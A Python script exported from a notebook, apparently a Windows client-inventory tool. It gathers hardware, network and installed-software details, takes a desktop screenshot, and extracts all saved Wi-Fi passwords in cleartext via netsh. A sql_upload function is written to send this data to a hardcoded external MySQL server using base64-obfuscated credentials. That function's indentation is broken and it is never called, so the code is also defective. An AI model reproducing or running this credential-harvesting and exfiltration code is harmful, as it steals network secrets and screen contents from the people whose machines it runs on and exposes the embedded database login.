#!/usr/bin/env python
# coding: utf-8

# In[2]:


def getID():
    while True:
        try:
            global client_id
            global pc_num
            client_id = int(input("CLIENT ID >> "))
            pc_num = int(input("PC NUMBER >> "))
            
            if('y' not in input("Correct input? y/n >> ")):
                getID()
               
            break
        except:
            print('Wrong Value!')
getID()


# In[7]:


import os, sys

from bs4 import BeautifulSoup as bs
#content = []
#with open("config.xml", "r") as file:
#    content = file.readlines()
#    content = "".join(content)
#    bs_content = bs(content, "xml")
#    client_id = bs_content.find("ClientId").get_text()
#    pc_num = bs_content.find("PcNumber").get_text()

    
from pathlib import Path
home = str(Path.home())
report_path = str(Path.home()) + '\_SysInfo'


# In[16]:


import traceback
import winreg
import requests
import json
import time
from ctypes import *


import base64 
import win32api
import wmi, psutil, re
import datetime
from datetime import date
from mss import mss
from pyautogui import hotkey
from pywinauto import Application
import pygetwindow as gw
from subprocess import check_output, CalledProcessError
#from xml.etree.ElementTree import fromstring
from lxml import etree
from ipaddress import IPv4Interface, IPv6Interface
import pathlib
#create working directory
#vars
def init1():
    global computer
    global bios
    global cpu_cores
    global cpu_name
    global ram
    global os_name
    global os_version
    global os_arch
    global device_type
    global motherboard
    global osi
    global gpu_names
    global wifi_passwords
    global isp_name
    global default_gateway
    global default_inet_device
    global disk_devices
    global network_devices
    global partitions
    global software
    bios = ''
    cpu_cores = 0
    cpu_name = ''
    ram = 0
    os_name = ''
    os_version = ''
    os_arch = 0
    device_type = ''
    motherboard = ''
    osi = ''
    gpu_names = []
    wifi_passwords = []
    isp_name = ''
    default_gateway = ''
    default_inet_device = ''
    disk_devices = []
    network_devices = []
    partitions = []
    software = []

computer = wmi.WMI()
try:
    os.mkdir(report_path)
except OSError:
    print ("Creation of the directory %s failed" % report_path)
else:
    print ("Successfully created the directory %s" % report_path)
if os.getcwd != report_path:
    os.chdir(report_path)


# In[17]:


orig_stdout = sys.stdout
f = open('report.txt', 'w')
sys.stdout = f

client_json = ""

client_txt = ""
client_scr = ""

os.system('chcp 437')


# In[18]:


#desktop screenshot

def screenshot():


    user32 = windll.user32
    #win+d
    user32.keybd_event(0x5B,0,0,0)
    time.sleep(.01)
    user32.keybd_event(0x44,0,0,0)
    time.sleep(.01)
    user32.keybd_event(0x44,0,2,0)
    time.sleep(.01)
    user32.keybd_event(0x5B,0,2,0)
    time.sleep(.01)
    
    #win+b
    user32.keybd_event(0x5B,0,0,0)
    time.sleep(.01)
    user32.keybd_event(0x42,0,0,0)
    time.sleep(.01)
    user32.keybd_event(0x42,0,2,0)
    time.sleep(.01)
    user32.keybd_event(0x5B,0,2,0)
    time.sleep(.01)
    
    #enter
    user32.keybd_event(0x0D,0,0,0)
    time.sleep(.01)
    user32.keybd_event(0x0D,0,2,0)
    time.sleep(1)
    with mss() as mss_instance:
        time.sleep(1)
        mss_instance.shot(output='screenshot.png')


# In[ ]:





# In[1]:


def hw_info():
    os.system('chcp 437')
    global computer
    global bios
    global cpu_cores
    global cpu_name
    global ram
    global os_name
    global os_version
    global os_arch
    global device_type
    global motherboard
    global osi
    global gpu_names
    cpu_cores = psutil.cpu_count()
    computer_info = computer.Win32_ComputerSystem()[0]
    os_info = computer.Win32_OperatingSystem()[0]
    proc_info = computer.Win32_Processor()[0]

    os_name = str(os_info.Name).split('|')[0]
    os_version = ' '.join([os_info.Version])
    system_ram = round(float(os_info.TotalVisibleMemorySize) / 1048576)

    print('OS Name: {0}'.format(str(os_info.Name).split('|')[0]))
    print('OS Version: {0}'.format(os_version))

    if 'PROGRAMFILES(X86)' in os.environ:
        print('OS Arch: 64bit')
        os_arch = 64
    else:
        print('OS Arch: 32bit')
        os_arch = 32


    if computer.Win32_SystemEnclosure()[0].ChassisTypes[0] == 9 or computer.Win32_SystemEnclosure()[0].ChassisTypes[0] ==10 or computer.Win32_SystemEnclosure()[0].ChassisTypes[0] == 14:
        device_type = 'Notebook'
    else:
        device_type = "PC"


    notebook_model = computer.Win32_ComputerSystemProduct()[0].Vendor + " " + computer.Win32_ComputerSystemProduct()[0].Name
    print(device_type, notebook_model)

    motherboard = computer.Win32_Baseboard()[0].Manufacturer + ' ' + computer.Win32_Baseboard()[0].Product
    print('Motherboard: {0}'.format(motherboard))

    osi = computer.Win32_OperatingSystem()[0].InstallDate
    print('OS installation date: {0}'.format(datetime.datetime.strptime(osi[0:12], "%Y%m%d%H%M%S")))
    print('')
    print('CPU: {0}'.format(proc_info.Name))
    cpu_name = proc_info.Name
    print('CPU cores: {0}'.format(cpu_cores))
    print('RAM: {0} GB'.format(system_ram))
    ram = system_ram
    gpu_names = []
    for a in computer.Win32_VideoController():
        print('Graphics Card: {0}'.format(a.Name))
        gpu_names.append(a.Name)

    print('BIOS: {0}'.format(computer.Win32_Bios()[0].SMBIOSBIOSVersion))
    bios = computer.Win32_Bios()[0].SMBIOSBIOSVersion


# In[ ]:





# In[20]:


def get_isp():
    global isp_name
    r = requests.get("http://ip-api.com/xml/")
    soup = bs(r.content, 'xml')
    isp = soup.find("as")
    isp_name = isp.text
    return isp_name
    
def inet_info():
    global default_gateway
    global default_inet_device
    print('\nInternet provider: {0}'.format(get_isp()))
    print()
    nics = get_network_devices(1)
    default_gateway = nics[0]['gateway']
    default_inet_device = nics[0]['hardware']


# In[21]:


def get_wifi_pass():
    check = str(check_output("wmic.exe service where 'name like \"%wlansvc%\"' get started"))
    if check.find('TRUE') == -1:
        print("No Wifi")
        printc("No Wifi")
        return
    global wifi_passwords
    wp = []
    
    os.system('chcp 437')
    data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = check_output('netsh wlan show profile \"' + i + '\" key=clear').decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            wp.append("{:<30}|  {:<}".format(i, results[0]))
        except IndexError:
            print ("{:<30}|  {:<}".format(i, ""))

    for a in wp:
        a = a.split('|')
        a[0] = a[0].strip()
        a[1] = a[1].strip()
        print(a[0], '\t- ', a[1])
        wifi_passwords.append(a)
        


# In[22]:


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# In[27]:


def get_disk_info():
    i = 0
    global partitions
    for a in computer.Win32_DiskDrive():
        print('Disk ' + str(i) + " - " + a.Model)
        i = i + 1
        disk_devices.append(a.Model)
    print("Partitions and Usage:")
    # get all disk partitions
    partitions = psutil.disk_partitions()
    for partition in partitions:
        print(f"=== Device: {partition.device} ===")
        try:
            print(f"  File system type: {partition.fstype}")
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                # this can be catched due to the disk that
                # isn't ready
                continue
            print(f"  Total Size: {get_size(partition_usage.total)}")
            print(f"  Used: {get_size(partition_usage.used)}")
            print(f"  Free: {get_size(partition_usage.free)}")
            print(f"  Percentage: {partition_usage.percent}%")
        except WinError:
            printc("Non Windows partition")
            continue


# In[28]:


def get_network_devices(IPEnabled):
    nd = []
    if IPEnabled==1:
        for nic in computer.Win32_NetworkAdapterConfiguration():
            if nic.DefaultIPGateway != None:
                nd.append({'hardware': nic.Caption, 
                                        'hostname': nic.DNSHostName, 
                                        'mac': nic.MACAddress, 
                                        'gateway': nic.DefaultIPGateway[0]})
                print('\nhardware:', nic.Caption, 
                      '\nhostname:', nic.DNSHostName, 
                      '\nmac:', nic.MACAddress, 
                      '\ngateway:', nic.DefaultIPGateway[0])
    if IPEnabled==0:
        for nic in computer.Win32_NetworkAdapterConfiguration():
            if nic.MACAddress != None:
                nd.append({'hardware': nic.Caption, 
                                        'hostname': nic.DNSHostName, 
                                        'mac': nic.MACAddress, 
                                        'gateway': nic.DefaultIPGateway})
                print('\nhardware:', nic.Caption, 
                      '\nhostname:', nic.DNSHostName, 
                      '\nmac:', nic.MACAddress, 
                      '\ngateway:', nic.DefaultIPGateway)
    return nd


# In[29]:


def get_software():
    global software
    software = []
    names = []
    os.system('chcp 65001')
    regs = check_output(r'reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', shell=True).decode('utf-8').split('\r')
    regs += (check_output(r'reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', shell=True).decode('utf-8').split('\r'))
    for a in regs:
        if a !='':
            a = a.strip()
            try:
                with open(os.devnull, 'w') as devnull:
                    tmp = check_output('reg query ' + a + ' /v DisplayName',stderr=devnull).decode('utf-8').split('\r')[2]
                
            except CalledProcessError as e:
                pass
            else:
                names.append(tmp[30:])
    names.sort()
    for a in names:
        software.append(a)
        print(a)
        


# In[30]:


def printc(text):
    tmp = sys.stdout
    sys.stdout = orig_stdout
    print(text)
    sys.stdout = tmp


# In[31]:


init1()
screenshot()
with open("screenshot.png", "rb") as image_file:
    client_scr = image_file.read()
    
print("-"*20 + "OS|HW Information" + "-"*18)
try:
    hw_info()
except Exception as e:
    traceback.print_exc()
    printc(e)
else:
    printc("HW info \tOK")
print("-"*54)

print("-"*20 + "Internet info" + "-"*21)
try:
    inet_info()
except Exception as e:
    traceback.print_exc()
    printc(e)
else:
    print("-"*54)
printc("Internet info \tOK")
print("-"*20 + "Wifi" + "-"*30)
try:
    get_wifi_pass()
except Exception as e:
    traceback.print_exc()
    printc(e)
else:
    printc("Wifi info \tOK")
print("-"*54)


print("-"*20 + "Disk Info" + "-"*25)
try:
    get_disk_info()
except Exception as e:
    traceback.print_exc()
    printc(e)
else:
    printc("Disk info \tOK")
print("-"*54)


print("-"*20 + "Network Devices" + "-"*19)
global network_devices

try:
    network_devices = get_network_devices(0)
except Exception as e:
    traceback.print_exc()
    printc(e)
else:
    printc("Network info \tOK")
print("-"*54)

print("-"*20 + "Software List" + "-"*21)
try:
    get_software()
except Exception as e:
    traceback.print_exc()
    printc(e)
else:
    printc("Software info \tOK")
print("-"*54)


# In[32]:


sys.stdout = orig_stdout
f.close()
f = open('report.txt', 'r')
client_txt = bytes(base64.b64encode(f.read().encode('utf-8')))
f.close()


# In[33]:


x = {
   'os_name': os_name,
    'os_version': os_version,
    'os_arch': os_arch,
    'bios': bios,
    'cpu_name': cpu_name,
    'cpu_cores': cpu_cores,
    'gpu_names': gpu_names,
    'ram': ram,
    'device_type': device_type,
    'motherboard': motherboard,
    'os_install_date': osi,
    'wifi_passwords': wifi_passwords,
    'isp_name': isp_name,
    'default_gateway': default_gateway,
    'default_inet_device': default_inet_device,
    'disk_devices': disk_devices,
    'network_devices': network_devices,
    'software': software,
}
f = open('report.json', 'w')
f.write(json.dumps(x))
client_json = bytes(base64.b64encode(json.dumps(x).encode('utf-8')))
f.close()


# In[34]:

def sql_upload():

 import pymysql
	 
 con = pymysql.connect('185.228.233.75', base64.b64decode('dGVjaA==').decode(), base64.b64decode('d0hhdC5pcy5sb3ZlLjI=').decode(), 'main_schema')
	try :
		with con.cursor() as cursor:

			# SQL 
			sql =  f"INSERT client_data(client_id, pc_num, info_json, info_txt, screenshot, is_unloaded) VALUES ( %s, %s, %s, %s, %s, %s);"
			#
			args = (client_id, pc_num, client_json.decode(), client_txt.decode(),client_scr, 0)
			cursor.execute(sql, args)
			con.commit() 

	finally:
		con.close()
		print("uploaded!")


input()   
    




